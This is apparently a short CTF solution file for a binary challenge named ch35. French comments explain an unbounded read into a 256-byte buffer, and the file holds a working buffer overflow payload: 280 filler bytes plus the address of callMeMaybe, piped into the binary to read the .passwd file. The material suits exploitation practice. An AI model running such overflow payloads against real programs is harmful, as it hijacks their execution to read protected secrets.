@@ -1,0 +1,13 @@
+#on a un buffer de 256 mais on lit autant de caracteres que l'on veut. overflow sur le buffer.
+#on cherche l'adresse de la fonction callMeMaybe (nm ch35)
+#on cherche le retour du main l'ecrasant avec nimporte quoi. au segfault, on ajoute l'adresse de la fonction callMeMaybe
+#il reste plus qu'a bloquer avec un cat pour pouvoir voir le pass
+
+(echo `python -c 'print "A"*280 + "\xcd\x06\x40\x00\x00\x00\x00\x00"'`;cat)  | ./ch35
+
+nm ch35
+00000000004006cd T callMeMaybe
+
+python -c 'print "A"*280 + "\xcd\x06\x40\x00\x00\x00\x00\x00"' > /tmp/pff
+(cat /tmp/pff; cat) | ./ch35
+cat .passwd
